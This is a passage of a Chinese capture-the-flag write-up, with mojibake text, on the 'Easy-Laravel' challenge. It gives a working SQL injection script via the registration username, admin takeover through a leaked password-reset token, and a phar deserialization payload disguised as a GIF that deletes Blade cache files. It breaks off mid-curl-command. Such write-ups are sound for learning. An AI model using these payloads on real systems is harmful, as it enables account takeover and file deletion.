href="/images/2018/10/20181014171439-941dc498-cf91-1.png"><img src="/images/2018/10/20181014171439-941dc498-cf91-1-1024x552.png" /></a> skyçš„wp <a href="/images/2018/10/B23978EFC504FD81383F78A38BD16060.png"><img src="/images/2018/10/B23978EFC504FD81383F78A38BD16060.png" /></a></p><h2 id="easy-laravel">Easy-Laravel</h2><h3 id="æºç æ³„æ¼">æºç æ³„æ¼</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- code: https://github.com/qqqqqqvq/easy_laravel --&gt;</span><br></pre></td></tr></table></figure><p>è™½ç„¶å·²ç»æ²¡æœ‰è¿™ä¸ªä»“åº“äº†,æˆ‘ä»¬å¯ä»¥å»å®˜æ–¹ä»“åº“çœ‹æºç </p><h3 id="æ³¨å…¥">æ³¨å…¥</h3><p>noteå­˜åœ¨æ³¨å…¥ <a href="/images/2018/10/2018-10-18-15-44-53å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-18-15-44-53å±å¹•æˆªå›¾.png" /></a> æ³¨å†Œçš„ç”¨æˆ·åæ²¡æœ‰é™åˆ¶,è‡ªå·±è·‘å°±å¥½,è¿™é‡Œæˆ‘å†™äº†ä¸ªè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">init_num = random.randint(<span class="number">1</span>,<span class="number">100000000000000</span>)</span><br><span class="line">u = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    init_num += <span class="number">1</span></span><br><span class="line">    username = <span class="string">&quot;admin&#x27; union select 1,(&quot;</span> + <span class="built_in">input</span>(<span class="string">&#x27;input:&#x27;</span>) + <span class="string">&#x27;),3,4,5#&#x27;</span></span><br><span class="line"></span><br><span class="line">    r = u.get(<span class="string">&#x27;http://127.0.0.1/register&#x27;</span>)</span><br><span class="line">    token = re.findall(<span class="string">&#x27;name=&quot;_token&quot; value=&quot;([^&quot;]+)&quot;&#x27;</span>, r.text)</span><br><span class="line">    email = <span class="built_in">str</span>(init_num) + <span class="string">&#x27;@qq.com&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;_token&#x27;</span> : token[<span class="number">0</span>],</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> : username,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span> : email,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span> : email,</span><br><span class="line">        <span class="string">&#x27;password_confirmation&#x27;</span> : email</span><br><span class="line">    &#125;</span><br><span class="line">    r = u.post(<span class="string">&#x27;http://127.0.0.1/register&#x27;</span>, data = data)</span><br><span class="line">    r = u.get(<span class="string">&#x27;http://127.0.0.1/note&#x27;</span>)</span><br><span class="line">    text = re.findall(<span class="string">&#x27;&lt;div class=&quot;col-xs-10&quot;&gt;([^&lt;]+)&lt;/div&gt;&#x27;</span>, r.text)</span><br><span class="line">    <span class="built_in">print</span>(text)</span><br><span class="line">    u.post(<span class="string">&#x27;http://127.0.0.1/logout&#x27;</span>, data = &#123;<span class="string">&#x27;_token&#x27;</span> : token&#125;)</span><br></pre></td></tr></table></figure><p>ä¸è¿‡å¥½åƒä¸èƒ½ç”¨information_schema,é‚£ä¹ˆå°±ç›´æ¥æŸ¥çœ‹æ•°æ®åº“é‡Œé¢æœ‰ä»€ä¹ˆä¸œè¥¿ <a href="/images/2018/10/2018-10-18-15-51-19å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-18-15-51-19å±å¹•æˆªå›¾.png" /></a> è¯»ä¸€ä¸‹å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">input:select password from users limit 0,1</span><br><span class="line">[&#x27; $2y$10$rY8DAmSEJ99Au5pL.vCQ2eGdAAUek/hGMm.trPDpgK6KBAvddiy32 &#x27;]</span><br></pre></td></tr></table></figure><p>ä¼¼ä¹å¹¶ä¸èƒ½è§£,é‚£ä¹ˆæ€ä¹ˆåŠå‘¢,æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‰é¢è¿˜æœ‰å¯†ç é‡ç½®,æˆ‘ä»¬å»é‡ç½®å¯†ç </p><h3 id="é‡ç½®å¯†ç ">é‡ç½®å¯†ç </h3><p>ç›´æ¥reseté¡µé¢é‡ç½®ä¼šæŠ¥é”™ <a href="/images/2018/10/2018-10-18-16-01-25å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-18-16-01-25å±å¹•æˆªå›¾.png" /></a> ç„¶åè¿™é‡Œå­¦ä¹ äº†ä¸€ä¸‹laravel... é¦–å…ˆwwwç›®å½•æœ‰ä¸€ä¸ª<code>composer.json</code>,é‚£æˆ‘ä»¬å…ˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer install</span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-18-16-59-21å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-18-16-59-21å±å¹•æˆªå›¾.png" /></a> ç„¶å<code>php artisan route:list</code> <a href="/images/2018/10/2018-10-18-17-00-31å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-18-17-00-31å±å¹•æˆªå›¾-1024x349.png" /></a> æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ª<code>password/reset/&#123;token&#125;</code> è¿™é‡Œå…¶å®æ˜¯å‡ºé¢˜äººè®¾è®¡è¿‡çš„</p><blockquote><p>è¿™é‡Œæ˜¯ç›´æ¥æŠŠç”Ÿæˆå‡ºæ¥çš„tokenå†™å…¥äº†æ•°æ®åº“ä¸­ï¼Œæ‰€ä»¥æˆ‘åœ¨å¼€å¤´æ”¾äº†ä¸€ä¸ªæ³¨å…¥ï¼Œæœ¬æ„å°±æ˜¯æ³¨å…¥å‡ºè¿™ä¸ªtokenå»é‡ç½®admin@qvq.imçš„å¯†ç ï¼Œå¯æ˜¯å¥½åƒå¾ˆå¤šäººéƒ½è¢«usersè¡¨é‡Œçš„remember_tokenè¯¯å¯¼äº†ï¼Œè¿™ä¹Ÿæ˜¯ä½¿ç”¨ Laravel 5.4çš„åŸå› ï¼Œåœ¨é«˜äº5.4çš„ç‰ˆæœ¬ä¸­ï¼Œé‡ç½®å¯†ç è¿™ä¸ª token ä¼šè¢« bcrypt å†å­˜å…¥ï¼Œå°±å’Œç”¨æˆ·å¯†ç ä¸€æ ·</p></blockquote><p>å…ˆå‘é€ä¸€ä¸‹é“¾æ¥,ç„¶åè¯»token <a href="/images/2018/10/2018-10-18-17-21-17å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-18-17-21-17å±å¹•æˆªå›¾.png" /></a> ç™»å½•æˆåŠŸ <a href="/images/2018/10/2018-10-18-17-20-31å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-18-17-20-31å±å¹•æˆªå›¾.png" /></a> æŒ‰é“ç†æ¥è¯´ç°åœ¨æŸ¥çœ‹flagå°±åº”è¯¥æ‹¿åˆ°flagäº†,ä½†æ˜¯å¹¶æ²¡æœ‰ <a href="/images/2018/10/2018-10-18-17-22-25å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-18-17-22-25å±å¹•æˆªå›¾.png" /></a> ç»“åˆé¢˜ç›®æç¤º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">blade expired</span><br><span class="line">pop chain</span><br><span class="line">bladeæ¨¡æ¿</span><br></pre></td></tr></table></figure><p>bladeæ¨¡æ¿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.jianshu.com/p/7d65f9eb94be</span><br></pre></td></tr></table></figure><p>bladeæ˜¯laravelçš„ä¸€ä¸ªæ¨¡æ¿å¼•æ“.å®ƒä¸åƒå…¶ä»–æµè¡Œçš„ PHP æ¨¡æ¿å¼•æ“é‚£æ ·é™åˆ¶ä½ åœ¨è§†å›¾ä¸­ä½¿ç”¨åŸç”Ÿçš„ PHP ä»£ç ï¼Œäº‹å®ä¸Šå®ƒå°±æ˜¯æŠŠ Blade è§†å›¾ç¼–è¯‘æˆåŸç”Ÿçš„ PHP ä»£ç å¹¶ç¼“å­˜èµ·æ¥ã€‚ç¼“å­˜ä¼šåœ¨ Blade è§†å›¾æ”¹å˜æ—¶è€Œæ”¹å˜ï¼Œè¿™æ„å‘³ç€ Blade å¹¶æ²¡æœ‰ç»™ä½ çš„åº”ç”¨æ·»åŠ ç¼–è¯‘çš„è´Ÿæ‹…ã€‚ æ‰€ä»¥æˆ‘ä»¬è¿™çš„æ€è·¯å¾ˆæ¸…æ™°ï¼š 1.å› ä¸ºæ—§çš„ç¼“å­˜å­˜åœ¨ï¼Œå¯¼è‡´æˆ‘ä»¬çœ‹ä¸åˆ°flag 2.æˆ‘ä»¬å¯ä»¥åˆ©ç”¨pop chainåˆ æ‰ç¼“å­˜æ–‡ä»¶ 3.è¯»åˆ°flag å®ƒçš„æ¨¡æ¿æ–‡ä»¶æ”¾åœ¨äº†<code>resources/views</code>ä¸‹é¢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@be1168dd87c7:/usr/share/nginx/html/resources/views<span class="comment"># ls -lsa</span></span><br><span class="line">total 44</span><br><span class="line">4 drwxr-xr-x 6 root root 4096 Oct 17 17:45 .</span><br><span class="line">4 drwxr-xr-x 5 root root 4096 Oct 17 17:45 ..</span><br><span class="line">4 drwxr-xr-x 3 root root 4096 Oct 17 17:45 auth</span><br><span class="line">4 drwxr-xr-x 2 root root 4096 Oct 17 17:45 errors</span><br><span class="line">4 -rw-r--r-- 1 root root 1054 Oct 17 17:45 files.blade.php</span><br><span class="line">4 -rw-r--r-- 1 root root  410 Oct 17 17:45 home.blade.php</span><br><span class="line">4 drwxr-xr-x 2 root root 4096 Oct 17 17:45 layouts</span><br><span class="line">4 -rw-r--r-- 1 root root  558 Oct 17 17:45 note.blade.php</span><br><span class="line">4 -rw-r--r-- 1 root root 1014 Oct 17 17:45 upload.blade.php</span><br><span class="line">4 drwxr-xr-x 3 root root 4096 Oct 17 17:45 vendor</span><br><span class="line">4 -rw-r--r-- 1 root root 2213 Oct 17 17:45 welcome.blade.php</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ä¹‹åæ”¾åœ¨äº†<code>storage/framework/views</code> <a href="/images/2018/10/2018-10-18-17-37-59å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-18-17-37-59å±å¹•æˆªå›¾.png" /></a> å®ƒçš„è¿‡æœŸåˆ¤æ–­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isExpired</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$compiled</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCompiledPath</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the compiled file doesn&#x27;t exist we will indicate that the view is expired</span></span><br><span class="line">    <span class="comment">// so that it can be re-compiled. Else, we will verify the last modification</span></span><br><span class="line">    <span class="comment">// of the views is less than the modification times of the compiled views.</span></span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable language_">$this</span>-&gt;files-&gt;<span class="title function_ invoke__">exists</span>(<span class="variable">$compiled</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$lastModified</span> = <span class="variable language_">$this</span>-&gt;files-&gt;<span class="title function_ invoke__">lastModified</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$lastModified</span> &gt;= <span class="variable language_">$this</span>-&gt;files-&gt;<span class="title function_ invoke__">lastModified</span>(<span class="variable">$compiled</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå­˜æ”¾è·¯å¾„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCompiledPath</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;cachePath.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$path</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>cachePathåœ¨å“ªå‘¢?å‰é¢çš„æç¤º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginxæ˜¯å å¼çš„ ( å¥½éº»çƒ¦ï¼Œé»˜è®¤é…ç½®ä¹Ÿæ˜¯å å¼çš„</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè¯´æ˜è·¯å¾„å°±æ˜¯<code>/usr/share/nginx/html</code> ä½†æ˜¯è¦æ€ä¹ˆåˆ é™¤å‘¢?</p><h3 id="pharååºåˆ—åŒ–">pharååºåˆ—åŒ–</h3><p>çœ‹åˆ°uploadçš„æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UploadController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">middleware</span>([<span class="string">&#x27;auth&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;path = <span class="title function_ invoke__">storage_path</span>(<span class="string">&#x27;app/public&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">view</span>(<span class="string">&#x27;upload&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">UploadRequest <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$file</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">isValid</span>())) &#123;</span><br><span class="line">            <span class="variable">$allowed_extensions</span> = [<span class="string">&quot;bmp&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>];</span><br><span class="line">            <span class="variable">$ext</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientOriginalExtension</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allowed_extensions</span>))&#123;</span><br><span class="line">                <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">move</span>(<span class="variable">$this</span>-&gt;path, <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientOriginalName</span>());</span><br><span class="line">                <span class="title class_">Flash</span>::<span class="title function_ invoke__">success</span>(<span class="string">&#x27;ä¸Šä¼ æˆåŠŸ&#x27;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">route</span>(<span class="string">&#x27;upload&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">Flash</span>::<span class="title function_ invoke__">error</span>(<span class="string">&#x27;ä¸Šä¼ å¤±è´¥&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">route</span>(<span class="string">&#x27;upload&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">files</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$files</span> = <span class="title function_ invoke__">array_except</span>(<span class="title class_">Storage</span>::<span class="title function_ invoke__">allFiles</span>(<span class="string">&#x27;public&#x27;</span>), [<span class="string">&#x27;0&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">view</span>(<span class="string">&#x27;files&#x27;</span>)-&gt;<span class="title function_ invoke__">with</span>(<span class="string">&#x27;files&#x27;</span>, <span class="variable">$files</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="string">&#x27;path&#x27;</span>, <span class="variable">$this</span>-&gt;path);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="string">&#x27;filename&#x27;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$filename</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>))&#123;</span><br><span class="line">                <span class="title class_">Flash</span>::<span class="title function_ invoke__">error</span>(<span class="string">&#x27;ç£ç›˜æ–‡ä»¶å·²åˆ é™¤ï¼Œåˆ·æ–°æ–‡ä»¶åˆ—è¡¨&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="title class_">Flash</span>::<span class="title function_ invoke__">success</span>(<span class="string">&#x27;æ–‡ä»¶æœ‰æ•ˆ&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">route</span>(<span class="string">&#x27;files&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°checké‡Œé¢ç”¨åˆ°äº†file_exists,è·¯å¾„ä¹Ÿç¡®å®š,ä¸Šä¼ çš„æ—¶å€™è¦æ±‚ä¸ºimage,æ”¹ä¸€ä¸ªå¤´å°±è¿‡äº† é‚£ä¹ˆç°åœ¨å°±è¦æ‰¾ä¸€ä¸ªå¯ä»¥è§¦å‘åˆ é™¤æ–‡ä»¶çš„ç±» <a href="/images/2018/10/2018-10-18-18-12-30å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-18-18-12-30å±å¹•æˆªå›¾-1024x464.png" /></a> ç„¶åæˆ‘ä»¬åœ¨<code>swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php</code>æ‰¾åˆ°å¯ç”¨ç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_TemporaryFileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_FileByteStream</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$filePath</span> = <span class="title function_ invoke__">tempnam</span>(<span class="title function_ invoke__">sys_get_temp_dir</span>(), <span class="string">&#x27;FileByteStream&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$filePath</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Swift_IoException</span>(<span class="string">&#x27;Failed to retrieve temporary file name.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$filePath</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getContent</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getPath</span>())) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Swift_IoException</span>(<span class="string">&#x27;Failed to get temporary file content.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getPath</span>())) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getPath</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;autoload.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Swift_ByteStream_TemporaryFileByteStream</span>());</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>));</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\/tmp\/FileByteStream[a-zA-Z0-9]&#123;6&#125;/&#x27;</span>, <span class="string">&quot;/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php&quot;</span>, <span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;s:25&#x27;</span>, <span class="string">&#x27;s:90&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line">    <span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;./blacsheep.phar&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$b</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line">    <span class="title function_ invoke__">rename</span>(<span class="string">&#x27;blacsheep.phar&#x27;</span>, <span class="string">&#x27;blacsheep.gif&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¼ ä¸Šå»ä¹‹åcurlæ¥checkä¸€ä¸‹è§¦å‘åˆ é™¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@kali:/home/blacsheep  $ curl -X POST --data <span class="string">&quot;path=phar:///usr/share/nginx/html/storage/app/public&amp;filename=/blacsheep.gif&amp;_token=H1zLI745JltuZPTvk19zfm0BDzaMScRv4Sghq6bx&quot;</span> --cookie <span 